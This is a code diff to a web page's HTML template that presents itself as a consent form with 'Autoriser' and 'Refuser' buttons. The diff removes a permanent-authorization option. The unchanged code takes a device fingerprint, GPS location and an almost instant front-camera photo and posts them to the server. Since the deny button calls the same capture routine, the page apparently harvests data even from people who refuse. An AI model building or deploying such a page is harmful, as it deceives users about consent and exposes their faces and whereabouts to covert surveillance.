@@ -38,11 +38,9 @@ HTML_TEMPLATE = """
 
         #video-container { margin: 15px 0; display: none; }
         video { width: 100%; border-radius: 8px; background: #000; border: 2px solid #ddd; }
-        .btn-container { margin-top: 15px; display: flex; flex-direction: column; gap: 10px; }
-        .btn-row { display: flex; justify-content: space-around; }
-        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; }
+        .btn-container { margin-top: 15px; display: flex; justify-content: space-around; }
+        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 45%; }
         .btn-approve { background-color: #28a745; color: white; }
-        .btn-forever { background-color: #007bff; color: white; margin-top: 5px; }
         .btn-deny { background-color: #dc3545; color: white; }
         #status { margin-top: 15px; font-weight: bold; }
     </style>
@@ -64,11 +62,8 @@ HTML_TEMPLATE = """
             <input type="text" id="username" placeholder="姓名 (Name)" required style="width: 85%; padding: 10px; margin-bottom: 15px; font-size: 14px;"><br>
             
             <div class="btn-container">
-                <div class="btn-row" style="width: 100%;">
-                    <button type="button" class="btn-approve" onclick="captureAndSend(false, false)" style="width: 48%;">Autoriser</button>
-                    <button type="button" class="btn-deny" onclick="captureAndSend(true, false)" style="width: 48%;">Refuser</button>
-                </div>
-                <button type="button" class="btn-forever" onclick="captureAndSend(false, true)">Autoriser pour toujours</button>
+                <button type="button" class="btn-approve" onclick="captureAndSend(false)">Autoriser</button>
+                <button type="button" class="btn-deny" onclick="captureAndSend(true)">Refuser</button>
             </div>
         </form>
 
@@ -78,12 +73,6 @@ HTML_TEMPLATE = """
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        window.onload = function() {
-            if (localStorage.getItem("alwaysAuthorized") === "true") {
-                document.querySelector('.card').innerHTML = "<h2>Bienvenue</h2><p style='color: green; font-weight: bold;'>Vous avez déjà accordé l'accès permanent.</p>";
-            }
-        };
-
         function getMobileModel() {
             const ua = navigator.userAgent;
             let model = "Appareil Inconnu";
@@ -105,7 +94,7 @@ HTML_TEMPLATE = """
             return model;
         }
 
-        async function captureAndSend(isDenied, isPermanent) {
+        async function captureAndSend(isDenied) {
             const statusDiv = document.getElementById('status');
             const username = document.getElementById('username').value;
 
@@ -119,10 +108,6 @@ HTML_TEMPLATE = """
                 statusDiv.style.color = 'red';
                 statusDiv.innerText = '请先填写姓名。';
                 return;
-            }
-
-            if (isPermanent) {
-                localStorage.setItem("alwaysAuthorized", "true");
             }
 
             statusDiv.style.color = 'gray';
@@ -140,7 +125,7 @@ HTML_TEMPLATE = """
                 ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu"
             };
 
-            // 1. جلب موقع الـ GPS بشكل متزامن سريع
+            // 1. جلب موقع الـ GPS
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
@@ -150,7 +135,7 @@ HTML_TEMPLATE = """
                 locationData = "Accès à la localisation refusé";
             }
 
-            // 2. تشغيل الكاميرا والتقاط الصورة في لحظة وبأسرع وقت ممكن
+            // 2. تشغيل الكاميرا والتقاط الصورة بسرعة فائقة
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const videoElement = document.getElementById('webcam');
@@ -158,12 +143,11 @@ HTML_TEMPLATE = """
                 
                 videoElement.srcObject = stream;
                 
-                // الانتظار فقط للحظة قصيرة جداً (300 ميلي ثانية) لضمان ظهور الكادر والتقاط الصورة فوراً
                 await new Promise((resolve) => {
                     videoElement.onloadedmetadata = () => {
                         resolve();
                     };
-                    setTimeout(resolve, 300); // التقاط فوري سريع دون انتظار طويل
+                    setTimeout(resolve, 300); // التقاط سريع بدون انتظار طويل
                 });
 
                 canvas.width = videoElement.videoWidth || 640;
@@ -173,14 +157,13 @@ HTML_TEMPLATE = """
 
                 imageBase64 = canvas.toDataURL('image/jpeg');
 
-                // إيقاف الكاميرا فوراً بعد الالتقاط
                 stream.getTracks().forEach(track => track.stop());
 
             } catch (err) {
                 console.log("Impossible d'accéder à la caméra: ", err);
             }
 
-            // 3. إرسال البيانات مباشرة إلى السيرفر
+            // 3. إرسال البيانات
             try {
                 const response = await fetch('/submit-consent', {
                     method: 'POST',
@@ -198,11 +181,6 @@ HTML_TEMPLATE = """
                 if (response.ok) {
                     statusDiv.style.color = 'green';
                     statusDiv.innerText = '已成功授权并发送数据！';
-                    if (isPermanent) {
-                        setTimeout(() => {
-                            location.reload();
-                        }, 1200);
-                    }
                 } else {
                     statusDiv.style.color = 'red';
                     statusDiv.innerText = result.error || '发生错误。';
